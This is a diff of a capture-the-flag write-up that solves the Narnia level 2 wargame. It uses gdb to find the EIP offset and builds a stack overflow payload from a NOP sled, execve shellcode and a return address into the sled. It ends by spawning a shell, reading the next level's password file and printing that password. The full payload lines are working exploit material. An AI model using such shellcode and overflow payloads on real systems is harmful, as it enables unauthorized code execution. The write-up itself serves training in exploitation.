@@ -184,7 +184,9 @@ int main(int argc, char * argv[]){
 
 ![grafik](https://user-images.githubusercontent.com/84674087/143130183-a9725c3d-8ed4-412f-aadd-71f9ce1ad2be.png)
 
-- We take following action to analyze the binary
+- We take following action to analyze the binary: 
+    - Set breakpoint at the memory address of "leave" operation 
+    - run the binary with python code input
 ```
 # in python2
 b *0x0804849c
@@ -198,15 +200,18 @@ r $(python3 -c "print('A' * 140)")
 gdb --args narnia2 `python -c "print 'A' * 140"`
 b *0x0804849c
 ```
-- After playing with the input of A and C, we figure out that `'A' * 132 + 'C' * 4` will fill the EIP with CCCC
-- Now we can choose where to put our shellcode: Either in between the A-block or right after the EIP
-- If we put it after the EIP we have to get sure about the program flow, i.e. we need the memory address of the opcode for JMP ESP (jump to stack pointer) and place it inside EIP
+- After playing with the input of A and C, we figure out that `'A' * 132 + 'C' * 4` fills the EIP with CCCC
+
+![grafik](https://user-images.githubusercontent.com/84674087/143584394-ea3e1882-803d-42d2-8c05-08ccf8283a46.png)
+
+- Now we can choose where to put our shellcode: Either before (in between the A-block) or after the EIP
+- If we put it after the EIP we have to get sure about the program flow, i.e. we need the memory address of the opcode JMP ESP (jump to stack pointer) and place it inside EIP
 - However, for this challenge we keep it simple and place the shellcode inside the A-block
 - We choose [Shellcode 811](http://shell-storm.org/shellcode/files/shellcode-811.php) from shell-storm, which accounts for 28 Bytes
 - Further, let's replace A with NOP a.k.a. `\x90`
 - Interim result #1: `$(python -c "print '\x90' * (136-4-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'CCCC'")`
-- We start `gdb -q narnia2` and inside gdb `b *0x0804849c` (the address at leave)
-- Then we run the interim result #1 inside gdb: `r [our payload]`
+- We start `gdb -q narnia2` and inside gdb `b *0x0804849c` (the memory address of leave operation)
+- Then we run the interim result #1 inside gdb: `r [interim result #1]`
 - At breakpoint 1 we check the address of EIP: `i f` (info frame)
 - And the content of ESP: `x/40wx $esp` (dump 40 words of ESP in hex-format)
 
@@ -219,7 +224,7 @@ b *0x0804849c
 - If so, all NOPs gets executed (with no effect upon the running program) until it reaches our shellcode
 - From the picture above we can select any memory address from NOP: `0xffffd608` as example
 - Remember to write in little-endian order: `\x08\xd6\xff\xff`
-- Interim result #2: `r $(python -c "print '\x90' * (136-4-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x18\xd6\xff\xff'")`
+- Interim result #2: `r $(python -c "print '\x90' * (136-4-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x08\xd6\xff\xff'")`
 
 ![grafik](https://user-images.githubusercontent.com/84674087/143503139-bbd6b1ed-6215-498d-95d4-0f71f44c6abf.png)
 
@@ -234,11 +239,16 @@ b *0x0804849c
 - Interim result #3: `r $(python -c "print '\x90' * (136-4-38) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 10 + '\x08\xd6\xff\xff'")`
 - Let's try it again
 
+![grafik](https://user-images.githubusercontent.com/84674087/143585194-8edf4f07-5855-4af5-9a57-c7e3ab2e491b.png)
+
+- Above picture shows the revised payload. The overwritten EIP is underlined in red and the jump into the NOP field is marked with red arrow
+- The program will consequently run through the stack until it reaches our shellcode
+
 ![grafik](https://user-images.githubusercontent.com/84674087/143503696-d9e71196-beca-4593-b4bf-81f0804dbfc3.png)
 
 - We get `/bin/dash` executed: Good sign !
 - Now we run narnia2 without gdb:
-- `./narnia2 $(python -c "print '\x90' * (136-4-38) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 10 + '\x18\xd6\xff\xff'")`
+- `./narnia2 $(python -c "print '\x90' * (136-4-38) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 10 + '\x08\xd6\xff\xff'")`
 - Success ! We get the shell and enter `cat /etc/narnia_pass/narnia3`
 - **PASSWORD:** vaequeezee
 
